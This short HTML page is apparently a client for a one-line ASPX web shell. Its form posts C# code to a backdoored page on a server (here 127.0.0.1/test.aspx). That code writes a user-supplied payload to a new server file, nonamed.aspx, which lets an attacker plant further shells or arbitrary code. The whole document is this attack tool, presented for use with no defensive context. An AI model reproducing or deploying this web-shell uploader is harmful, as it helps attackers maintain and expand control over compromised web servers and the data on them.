<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE> ASPX one line Code Client by amxku</TITLE>
</HEAD>
<BODY>
<form action=http://127.0.0.1/test.aspx method=post>
<textarea name=z cols=120 rows=10 width=45>
var nonamed=new System.IO.StreamWriter(Server.MapPath("nonamed.aspx"),false);
nonamed.Write(Request.Item["l"]);
nonamed.Close();
</textarea>
<textarea name=l cols=120 rows=10 width=45>your code</textarea><BR><center><br>
<input type=submit value=提交>
</BODY>
</HTML>
